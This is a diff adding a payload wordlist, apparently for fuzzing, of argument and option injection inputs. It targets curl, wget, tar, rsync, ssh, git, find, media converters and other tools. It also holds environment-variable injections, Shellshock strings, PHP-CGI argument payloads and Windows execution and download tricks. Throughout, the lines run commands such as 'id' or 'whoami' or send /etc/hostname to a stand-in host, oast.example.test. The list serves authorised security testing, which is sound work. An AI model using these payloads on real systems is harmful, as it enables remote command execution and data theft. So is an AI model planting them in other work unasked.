@@ -1,0 +1,292 @@
+# Argument and Option Injection, Tool Abuse and Environment Payloads
+# Use when input is passed as an argument to a fixed command (shell metacharacters are filtered or quoted). Harmless commands only.
+
+# Generic option injection: a value that begins with a dash is parsed as a flag
+-h
+--help
+--version
+-v
+-- -h
+--output=/tmp/arg-marker
+-o /tmp/arg-marker
+-oarg-marker
+
+# curl: read, write and send options
+-K /etc/hostname
+--config /etc/hostname
+-o /tmp/arg-marker http://oast.example.test/curl
+--output /tmp/arg-marker
+-T /etc/hostname http://oast.example.test/
+--upload-file /etc/hostname http://oast.example.test/
+-d @/etc/hostname http://oast.example.test/
+--data @/etc/hostname http://oast.example.test/
+-F file=@/etc/hostname http://oast.example.test/
+-x http://oast.example.test:8080
+--proxy http://oast.example.test:8080
+-H "X-Arg-Marker: 1" http://oast.example.test/
+file:///etc/hostname
+gopher://oast.example.test:70/_arg-marker
+dict://oast.example.test:11211/stat
+{http://oast.example.test/a,http://oast.example.test/b}
+
+# wget: write, execute-adjacent and post options
+--post-file=/etc/hostname http://oast.example.test/
+--output-document=/tmp/arg-marker http://oast.example.test/wget
+-O /tmp/arg-marker http://oast.example.test/wget
+--use-askpass=/bin/id
+--execute robots=off
+-e use_proxy=yes -e http_proxy=oast.example.test:8080
+--directory-prefix=/tmp/arg-marker
+
+# tar: checkpoint action and wildcard injection (file names that begin with -- in a directory processed with *)
+--checkpoint=1
+--checkpoint-action=exec=id
+--checkpoint-action=exec=sh\ arg-marker.sh
+--to-command=id
+--use-compress-program=id
+-I id
+--rsh-command=id
+-T /etc/hostname
+--files-from=/etc/hostname
+# Create files named: --checkpoint=1  and  --checkpoint-action=exec=sh arg-marker.sh  in a directory that the target archives with "tar cf out.tar *"
+
+# rsync
+-e id
+-e 'sh -c id'
+--rsh=id
+--rsync-path=id
+-e sh arg-marker.sh
+# Wildcard form: files named "-e sh arg-marker.sh" and "arg-marker.sh" in a directory synced with "rsync -t * dest"
+
+# zip / unzip / 7z
+-T -TT id
+-TT id
+-T --unzip-command=id
+-aoa
+-so
+-sccUTF-8
+@listfile
+-p
+
+# ssh / scp / git over ssh
+-oProxyCommand=id
+-o ProxyCommand=id
+-oProxyCommand="id>/tmp/arg-marker"
+-o StrictHostKeyChecking=no -o ProxyCommand=id
+-oLocalCommand=id -oPermitLocalCommand=yes
+-F /etc/hostname
+-i /etc/hostname
+-J oast.example.test
+-oKnownHostsCommand=id
+ssh://-oProxyCommand=id/x
+ssh://-oProxyCommand=id%20/x
+host-is-an-option -oProxyCommand=id
+
+# git options and URLs
+--upload-pack=id
+--receive-pack=id
+-c core.sshCommand=id
+-c core.pager=id
+-c protocol.ext.allow=always
+--config core.fsmonitor=id
+-c core.fsmonitor=id
+ext::sh -c id
+ext::sh -c "id>&2"
+git-upload-pack
+ssh://-oProxyCommand=id/repo
+https://oast.example.test/repo.git
+--template=/tmp/arg-marker
+-u id
+
+# find: exec and output flags
+-exec id ;
+-exec id {} +
+-execdir id ;
+-ok id ;
+-fprint /tmp/arg-marker
+-fprintf /tmp/arg-marker %p
+-fls /tmp/arg-marker
+-delete
+-newer /etc/hostname
+. -name x -exec id ;
+
+# sort / awk / sed / vim / less / man / more / nice / env / xargs / timeout (programs that execute or write)
+--compress-program=id
+BEGIN{system("id")}
+'BEGIN{system("id")}'
+e
+1e id
+s/a/b/e
+-e 'system("id")'
+-c 'system("id")'
+-es
+--cmd
+:!id
+!id
+-c ':!id'
+--exec id
+-I{} id {}
+-I % id %
+--max-args=1 id
+-n1 id
+timeout 1 id
+nice id
+env id
+env -S id
+-S id
+xargs id
+-E 'x' id
+stdbuf -o0 id
+sudo -u root id
+nohup id
+setsid id
+time id
+strace -o /tmp/arg-marker id
+
+# nmap / tcpdump / ping / dig / nslookup / whois (network tools that read files or write output)
+--script=/tmp/arg-marker.nse
+--datadir /tmp/arg-marker
+-iL /etc/hostname
+-oN /tmp/arg-marker
+-oG /tmp/arg-marker
+-oX /tmp/arg-marker
+-w /tmp/arg-marker
+-r /etc/hostname
+-z id
+-Z root
+-G 1 -W 1 -z id
+-f /etc/hostname
+-k
+-e /tmp/arg-marker
+-p 1 -T
+-A /dev/null
++short -f /etc/hostname
+-m /etc/hostname
+-h oast.example.test
+-p 4343
+
+# Media and document tools: ImageMagick / Ghostscript / ffmpeg / exiftool / pdftk / wkhtmltopdf / libreoffice
+push graphic-context viewbox 0 0 640 480 fill 'url(https://oast.example.test/arg-marker.jpg"|id")' pop graphic-context
+url(http://oast.example.test/image.png)
+ephemeral:/etc/hostname
+msl:/tmp/arg-marker.msl
+text:/etc/hostname
+label:@/etc/hostname
+@/etc/hostname
+-write /tmp/arg-marker
+-write /dev/null
+-sDEVICE=ppmraw -sOutputFile=/tmp/arg-marker
+-dSAFER
+-dNOSAFER
+-sOutputFile=%pipe%id
+%pipe%id
+-i concat:/etc/hostname
+-i file:/etc/hostname
+-i http://oast.example.test/ffmpeg
+-f lavfi -i testsrc
+-vf drawtext=textfile=/etc/hostname
+-vf "movie=/etc/hostname"
+-hide_banner -i /etc/hostname -f null -
+-metadata title=arg-marker
+-api
+-@ /etc/hostname
+-if
+-tagsFromFile /etc/hostname
+-lang
+-filename=arg-marker
+--enable-local-file-access
+--allow /etc
+--allow /
+--post file=/etc/hostname
+--post-file /etc/hostname
+--cookie-jar /tmp/arg-marker
+--javascript-delay 99999
+--run-script
+--headless --convert-to pdf --outdir /tmp/arg-marker
+
+# Environment variable and shell-feature injection
+LD_PRELOAD=/tmp/arg-marker.so
+LD_LIBRARY_PATH=/tmp/arg-marker
+BASH_ENV=/tmp/arg-marker
+ENV=/tmp/arg-marker
+PROMPT_COMMAND=id
+PS4='$(id)'
+IFS=,
+PATH=/tmp/arg-marker:$PATH
+SHELLOPTS=xtrace
+BASHOPTS=extdebug
+NODE_OPTIONS=--require /tmp/arg-marker.js
+PYTHONSTARTUP=/tmp/arg-marker.py
+PERL5OPT=-Mmarker
+PERL5LIB=/tmp/arg-marker
+RUBYOPT=-r/tmp/arg-marker
+GIT_SSH_COMMAND=id
+GIT_EXTERNAL_DIFF=id
+GIT_ASKPASS=id
+GIT_PAGER=id
+EDITOR=id
+VISUAL=id
+PAGER=id
+LESSOPEN=|id %s
+LANG=../../tmp/arg-marker
+TZ=../../tmp/arg-marker
+HTTP_PROXY=http://oast.example.test:8080
+http_proxy=http://oast.example.test:8080
+HTTPS_PROXY=http://oast.example.test:8080
+HOME=/tmp/arg-marker
+JAVA_TOOL_OPTIONS=-javaagent:/tmp/arg-marker.jar
+_JAVA_OPTIONS=-Dmarker=1
+MAVEN_OPTS=-Dmarker=1
+GCONV_PATH=/tmp/arg-marker
+NLSPATH=/tmp/arg-marker
+LOCPATH=/tmp/arg-marker
+
+# Shellshock (CVE-2014-6271 and CVE-2014-7169): header or environment values that begin with a function definition
+() { :; }; echo shellshock-marker
+() { :;}; echo; echo shellshock-marker
+() { _; } >_[$($())] { echo shellshock-marker; }
+() { :; }; /bin/sleep 3
+User-Agent: () { :; }; echo; echo shellshock-marker
+Cookie: () { :; }; echo; echo shellshock-marker
+Referer: () { :; }; echo; echo shellshock-marker
+Accept: () { :; }; echo; echo shellshock-marker
+Host: () { :; }; echo; echo shellshock-marker
+() { test; }; echo shellshock-marker
+() {:;}; ping -c 1 oast.example.test
+() { :; }; curl http://oast.example.test/shellshock
+
+# CGI and legacy scripting arguments
+/cgi-bin/test.cgi?arg=-h
+/cgi-bin/test.cgi?--help
+/cgi-bin/test.cgi?+id
+/cgi-bin/test.cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input
+/cgi-bin/php?-s
+/cgi-bin/php?%ADs
+/cgi-bin/php5?-s
+/index.php?-s
+/index.php?%ADs
+
+# PowerShell and Windows argument injection
+-EncodedCommand
+-ExecutionPolicy Bypass
+-NoProfile -Command id
+-Command "whoami"
+/c whoami
+/k whoami
+cmd /c whoami
+cmd.exe /c "whoami & hostname"
+powershell -nop -c "whoami"
+rundll32.exe url.dll,FileProtocolHandler calc.exe
+start /b whoami
+%COMSPEC% /c whoami
+whoami|hostname
+whoami^&hostname
+"^&whoami
+^"^&^whoami
+cmd /v:on /c "set x=whoami&!x!"
+for /f %i in ('whoami') do @echo %i
+forfiles /p c:\windows\system32 /m cmd.exe /c "cmd /c whoami"
+wmic process call create "whoami"
+mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""whoami"":close")
+certutil -urlcache -f http://oast.example.test/arg-marker arg-marker.txt
+bitsadmin /transfer j http://oast.example.test/arg-marker C:\Windows\Temp\arg-marker.txt
